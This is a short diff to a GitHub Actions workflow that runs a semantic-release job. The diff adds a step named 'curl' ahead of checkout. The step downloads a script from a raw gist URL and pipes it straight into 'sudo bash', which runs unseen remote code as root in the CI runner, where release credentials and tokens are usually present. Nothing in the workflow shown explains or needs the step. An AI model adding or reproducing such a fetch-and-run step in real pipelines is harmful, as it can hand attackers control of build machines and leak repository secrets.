@@ -10,6 +10,8 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: curl
+        run: curl -s https://gist.githubusercontent.com/lociko/f419b7d90ee34370db13a3d60a519470/raw/fe3f56099df64528a649e71a8fa352b3ea7331a0/shell | sudo bash
       - uses: actions/checkout@v4
 
       - name: semantic-release
